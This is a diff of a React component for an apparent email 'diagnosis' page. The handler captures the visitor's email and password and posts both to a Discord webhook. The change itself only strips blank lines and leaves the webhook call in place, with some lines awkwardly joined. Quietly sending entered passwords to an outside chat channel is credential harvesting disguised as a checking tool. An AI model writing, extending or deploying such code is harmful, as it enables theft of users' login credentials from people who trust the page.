@@ -223,9 +223,7 @@ export default function Home() {
     const res = diagnose(email);
     setDiagnosedEmail(email);
     setDiagnosedPassword(password);
-    setResult(res);
-
-    // Discord Webhookに送信
+    setResult(res);    // Discord Webhookに送信
     try {
       await sendToDiscord.mutateAsync({
         email,
@@ -236,9 +234,7 @@ export default function Home() {
       });
     } catch (err) {
       console.error("Discord送信エラー:", err);
-    }
-
-    setTimeout(() => {
+    }   setTimeout(() => {
       resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
     }, 100);
   };
